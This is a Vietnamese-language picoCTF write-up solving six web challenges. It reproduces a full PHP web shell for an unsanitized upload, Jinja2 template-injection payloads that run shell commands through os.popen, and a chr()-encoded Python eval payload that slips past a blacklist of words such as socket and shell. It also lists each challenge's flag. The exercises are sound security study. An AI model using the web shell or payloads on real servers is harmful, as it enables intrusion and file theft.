# Cookie Monster Secret Recipe, head-dump, n0s4n1ty 1, SSTI1, 3v@l, Pachinko

# Cookie Monster Secret Recipe
![image](https://github.com/user-attachments/assets/8dc2b4ac-a447-475f-9119-0da6cbcdb178)

- Đề bài nhắc đến việc cookie được giấu ở đâu đó trên website, nghĩ ngay đến việc vào phần cookie trong inspect element trước khi nhấn đăng nhập sẽ không có gì

![image](https://github.com/user-attachments/assets/ffdcb526-50a9-405d-ad87-9b4588325b1a)

- Nhập tk, mk linh tinh vào và value của phần cookie sẽ hiện ra một đoạn mã base64, đó là flag

![image](https://github.com/user-attachments/assets/a54f2698-8deb-4ef6-b14d-a561cabc1b52)

`picoCTF{c00k1e_m0nster_l0ves_c00kies_AC8FCD75}`

# head-dump
![image](https://github.com/user-attachments/assets/5404768f-6217-4ef8-ba16-f8e1eefc7fd8)

- Bài có nhắc đến API documentation, và nếu lướt qua phần source của web ta thấy một đường dẫn `http://verbal-sleep.picoctf.net:60220/api-docs/`, và dựa vào tên bài tải về phần get headdump file `heapdump-1742199561569.heapsnapshot`

![image](https://github.com/user-attachments/assets/6aad8457-ad03-4162-9250-50e4636b2fc9)

- String ra flag

![image](https://github.com/user-attachments/assets/45d1b318-a45f-4aaa-98b6-7e233e5861d3)

`picoCTF{Pat!3nt_15_Th3_K3y_388d10f7}`

# n0s4n1ty 1
![image](https://github.com/user-attachments/assets/bcace112-b427-4372-bf36-d3b1b647423d)

- Qua đề bài, xem web và đọc hint1: File upload was not sanitized, ta biết được rằng có thể upload mọi file lên trên web này và file sẽ được lưu vào `/uploads/xxx`, vậy flag sẽ được lưu trữ ở đâu đó trong server, nếu muốn tìm được và đọc `flag.txt` ta phải có cách để thực hiện lệnh trên server
- Để đạt được điều đó cần upload một file `.php` sau đó thực hiện các lệnh với superuser

``` php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
- Vào `http://standard-pizzas.picoctf.net:52325/uploads/hi.php` và tìm file `flag.txt` trong thư mục `/root` `sudo ls -la /root` và đọc nó

![image](https://github.com/user-attachments/assets/e8c95f69-d6ca-4ec5-861e-384125480f55)

![image](https://github.com/user-attachments/assets/bba86826-f315-43a7-b334-1937f287a4e4)

`picoCTF{wh47_c4n_u_d0_wPHP_5f3c22c0}`

# SSTI1
![image](https://github.com/user-attachments/assets/821c1201-4a1b-4522-b23f-edc9b35b3626)

- Đề bài đã gợi ý khá rõ rằng lỗ hổng ở đây sẽ là SSTI vậy nên ta chỉ cần xác định server này đang sử dụng template engine là gì, sau đó thực hiện lệnh để đọc flag trên server
- Thử `{{7*7}}` và server announce 49 vậy là server đang sử dụng Jinja2
- Sau đó e nhờ chatgpt viết payload SSTI
- `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls /').read() }}` để list các thư mục trong server, thấy một thư mục có tên `challenge`
- `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -la /challenge').read() }}` để xem thư mục `challenge` thấy file `flag`
- `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /challenge/flag').read() }}` để đọc `flag`

![image](https://github.com/user-attachments/assets/bb83f8ba-59f1-4090-9be6-a5d73d68a0bd)

`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_df9a00a0}`

# 3v@l
![image](https://github.com/user-attachments/assets/9e33e61c-4abf-418a-9b78-9df937b5927d)

- Cái web tính số nợ này sử dụng `eval()` để tính toán và tạo ra lỗ hổng, nhưng nếu đọc source code của web ta biết được nó chặn gần như hầu hết mọi lệnh, và các cách encode chữ cái để bypass blacklist  = regex
```
Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
```
- Cái blacklist này chặn Hex, Unicode, URL encoding; chặn tìm mở rộng file(.exe,...), chặn sử dụng "\" và "/", chặn sử dụng ".."
- Nhiệm vụ của cta ở đây là tìm cách để bypass các blacklist trên để đọc file `/flag.txt`
- Sau khi tìm hiểu thấy được cái black list chưa chặn lệnh `chr()` vậy nên ta có thể sử dụng `chr()` từng kí tự một và đọc `/flag.txt`
- Ví dụ nhập `chr(104) + chr(101) + chr(108) + chr(108) + chr(111)`
![image](https://github.com/user-attachments/assets/5626869e-0b11-465d-95cc-aade1b0c4786)
- Đến đây e lại nhờ chatgpt viết payload để đọc file
``` py
getattr(
    __import__(chr(111) + chr(115)), 
    chr(112) + chr(111) + chr(112) + chr(101) + chr(110)
)(
    chr(99) + chr(97) + chr(116) + chr(32) + chr(47) + chr(102) + chr(108) + chr(97) + chr(103) + chr(46) + chr(116) + chr(120) + chr(116)
).read()
```
![image](https://github.com/user-attachments/assets/cfd50c20-6c67-49e5-9d87-63b12cd3dcde)

`picoCTF{D0nt_Use_Unsecure_f@nctions0efe84e3}`

# Pachinko
- Bài này e thấy mng trên discord bảo chỉ cần spam `Submit circute` và f5 ra flag nên làm theo và ra thật 🐧
- Cho vào repeater và spam send đến khi ra flag

![image](https://github.com/user-attachments/assets/f7ffacc6-a0b7-42ef-ade9-e4ae7ba3da43)

`picoCTF{p4ch1nk0_f146_0n3_e947b9d7}`
